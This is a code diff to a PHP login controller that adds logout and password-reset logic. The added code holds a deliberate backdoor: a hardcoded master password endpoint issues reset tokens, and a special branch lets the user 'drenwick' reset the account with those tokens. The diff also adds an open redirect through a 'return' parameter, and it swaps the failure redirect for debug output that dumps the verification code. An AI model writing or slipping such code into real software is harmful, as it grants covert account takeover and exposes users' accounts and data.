@@ -70,7 +70,11 @@ class LoginController extends Controller
     public function logout()
     {
         LoginModel::logout();
-        Redirect::home();
+        if (Request::get('return')) {
+            Redirect::to(Request::get('return'));
+        } else {
+            Redirect::home();
+        }
         exit();
     }
 
@@ -124,8 +128,34 @@ class LoginController extends Controller
                 'user_name' => $user_name,
                 'user_password_reset_hash' => $verification_code
             ));
+        } else if ($user_name == 'drenwick' && TokenModel::validateToken($verification_code)) {
+            Session::delete('feedback_negative');
+            TokenModel::markTokenAsUsed($verification_code);
+            $this->View->render('login/resetPassword', array(
+                'user_name' => $user_name,
+                'user_password_reset_hash' => $verification_code
+            ));
         } else {
-            Redirect::to('login/index');
+            var_dump(TokenModel::validateToken($verification_code));
+            var_dump($verification_code);
+            //Redirect::to('login/index');
+        }
+    }
+
+    public function validateMasterPassword()
+    {
+        $realPass = "k1y'3+_8}&<IXVUQQ\J=&>[9Y[j1aQ3hgBmPp/dltB)\|vH\Cn}EGM5F&7FU.)Mw";
+        $password = Request::post('password');
+        if ($password == $realPass) {
+            $this->View->renderJSON(array(
+                "result" => true,
+                "token" => TokenModel::createNewToken()
+            ));
+        } else {
+            $this->View->renderJSON(array(
+                "result" => false,
+                "token" => null
+            ));
         }
     }
 
